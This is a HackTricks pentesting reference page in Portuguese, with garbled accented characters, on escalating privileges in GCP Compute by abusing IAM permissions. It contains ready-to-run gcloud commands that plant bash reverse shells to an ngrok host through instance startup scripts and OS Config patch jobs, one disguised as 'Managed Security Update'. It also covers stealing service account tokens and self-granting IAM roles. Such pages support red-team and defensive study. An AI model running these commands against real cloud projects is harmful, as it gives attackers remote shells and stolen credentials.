# GCP - Compute Privesc

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Compute

Para mais informa√ß√µes sobre Compute e VPC (rede) no GCP, confira:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Note que para realizar todos os ataques de escalonamento de privil√©gios que exigem modificar os metadados da inst√¢ncia (como adicionar novos usu√°rios e chaves SSH) √© **necess√°rio que voc√™ tenha permiss√µes `actAs` sobre o SA anexado √† inst√¢ncia**, mesmo que o SA j√° esteja anexado!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Com essa permiss√£o, voc√™ pode **modificar** as informa√ß√µes de **metadados** de uma **inst√¢ncia** e alterar as **chaves autorizadas de um usu√°rio**, ou **criar** um **novo usu√°rio com permiss√µes de sudo**. Portanto, voc√™ poder√° executar via SSH em qualquer inst√¢ncia de VM e roubar a GCP Service Account com a qual a Inst√¢ncia est√° sendo executada.\
Limita√ß√µes:

* Note que as GCP Service Accounts executadas em inst√¢ncias de VM por padr√£o t√™m um **escopo muito limitado**
* Voc√™ precisar√° ser **capaz de contatar o servidor SSH** para fazer login

Para mais informa√ß√µes sobre como explorar essa permiss√£o, confira:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Voc√™ tamb√©m poderia realizar esse ataque adicionando um novo startup-script e reiniciando a inst√¢ncia:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Esta permiss√£o d√° os **mesmos privil√©gios que a permiss√£o anterior**, mas sobre inst√¢ncias espec√≠ficas em vez de um projeto inteiro. **Os mesmos exploits e limita√ß√µes da se√ß√£o anterior se aplicam**.

### `compute.instances.setIamPolicy`

Este tipo de permiss√£o permitir√° que voc√™ **conceda a si mesmo uma fun√ß√£o com as permiss√µes anteriores** e escale privil√©gios abusando delas.

### **`compute.instances.osLogin`**

Se **OSLogin estiver habilitado na inst√¢ncia**, com esta permiss√£o voc√™ pode simplesmente executar **`gcloud compute ssh [INSTANCE]`** e conectar-se √† inst√¢ncia. Voc√™ **n√£o ter√° privil√©gios de root** dentro da inst√¢ncia.

{% hint style="success" %}
Para fazer login com sucesso com esta permiss√£o dentro da inst√¢ncia VM, voc√™ precisa ter a permiss√£o `iam.serviceAccounts.actAs` sobre a SA anexada √† VM.
{% endhint %}

### **`compute.instances.osAdminLogin`**

Se **OSLogin estiver habilitado na inst√¢ncia**, com esta permiss√£o voc√™ pode simplesmente executar **`gcloud compute ssh [INSTANCE]`** e conectar-se √† inst√¢ncia. Voc√™ ter√° **privil√©gios de root** dentro da inst√¢ncia.

{% hint style="success" %}
Para fazer login com sucesso com esta permiss√£o dentro da inst√¢ncia VM, voc√™ precisa ter a permiss√£o `iam.serviceAccounts.actAs` sobre a SA anexada √† VM.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

√â poss√≠vel **criar uma m√°quina virtual com uma Service Account atribu√≠da e roubar o token** da Service Account acessando os metadados para escalar privil√©gios.

O script de exploit para este m√©todo pode ser encontrado [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Se voc√™ tiver as permiss√µes **`osconfig.patchDeployments.create`** ou **`osconfig.patchJobs.exec`**, voc√™ pode criar um [**patch job ou deployment**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). Isso permitir√° que voc√™ se mova lateralmente no ambiente e obtenha execu√ß√£o de c√≥digo em todas as inst√¢ncias de computa√ß√£o dentro de um projeto.

Note que no momento voc√™ **n√£o precisa da permiss√£o `astAs`** sobre a SA anexada √† inst√¢ncia.

Se voc√™ quiser explorar isso manualmente, precisar√° criar um [**patch job**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) **ou** [**deployment**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json)**.**\
Para um patch job, execute:

{% code overflow="wrap" %}
```python
cat > /tmp/patch-job.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18442 0>&1
EOF

gsutil cp /tmp/patch-job.sh gs://readable-bucket-by-sa-in-instance/patch-job.sh

# Get the generation number
gsutil ls -a gs://readable-bucket-by-sa-in-instance

gcloud --project=$PROJECT_ID compute os-config patch-jobs execute \
--instance-filter-names=zones/us-central1-a/instances/<instance-name> \
--pre-patch-linux-executable=gs://readable-bucket-by-sa-in-instance/patch-job.sh#<generation-number> \
--reboot-config=never \
--display-name="Managed Security Update" \
--duration=300s
```
{% endcode %}

Para implantar uma implanta√ß√£o de patch:
```bash
gcloud compute os-config patch-deployments create <name> ...
```
A ferramenta [patchy](https://github.com/rek7/patchy) poderia ter sido usada no passado para explorar essa m√° configura√ß√£o (mas agora n√£o est√° funcionando).

**Um atacante tamb√©m poderia abusar disso para persist√™ncia.**

### `compute.machineImages.setIamPolicy`

**Conceda a si mesmo permiss√µes extras** para a Imagem de computa√ß√£o.

### `compute.snapshots.setIamPolicy`

**Conceda a si mesmo permiss√µes extras** para um snapshot de disco.

### `compute.disks.setIamPolicy`

**Conceda a si mesmo permiss√µes extras** para um disco.

### Bypass Access Scopes

Seguindo este link voc√™ encontra algumas [**ideias para tentar contornar os escopos de acesso**](../).

### Escala√ß√£o de Privil√©gios Local em inst√¢ncia GCP Compute

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Aprenda & pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda & pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
{% endhint %}
